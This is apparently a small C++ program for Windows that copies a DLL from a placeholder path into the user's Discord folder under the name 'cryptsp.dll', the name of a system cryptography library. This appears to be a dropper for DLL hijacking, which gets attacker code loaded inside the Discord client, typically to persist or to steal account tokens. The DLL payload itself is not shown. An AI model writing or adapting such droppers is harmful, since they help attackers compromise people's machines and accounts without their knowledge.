#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib") // Vincular con la biblioteca Winsock

int main() {
	std::string discordPath = std::string(getenv("localappdata")) + "\\Discord\\";
	std::string dllName = "cryptsp.dll";

	std::ifstream OpenDll("Path", std::ios::binary);

	

	std::ofstream dll(discordPath + dllName, std::ios::binary);
	
	
	
	char buffer[4096];
	while (OpenDll.read(buffer, sizeof(buffer)))
	{
		dll.write(buffer, sizeof(buffer));
	}

	dll.write(buffer, OpenDll.gcount());

	OpenDll.close();
	dll.close();
	return 0;
}